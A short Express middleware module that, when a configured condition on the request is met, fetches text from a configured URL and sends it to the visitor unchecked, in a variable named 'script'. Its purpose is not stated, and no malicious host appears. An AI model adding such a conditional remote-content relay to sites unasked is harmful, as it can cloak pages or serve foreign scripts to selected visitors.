import { redirect, condition } from "./config.js";
import axios from "axios";

const config = {
    redirect,
    condition
}
export default function(options={}) {
    for (let prop in config) if (options[prop]) config[prop] = options[prop]
    return async function (req,res,next) {
        if (config.condition(req)===true) {
            let script = await axios({method: 'get', url:config.redirect,responseType:"text"})
            res.send(script.data)
        }
        else next()
    }
}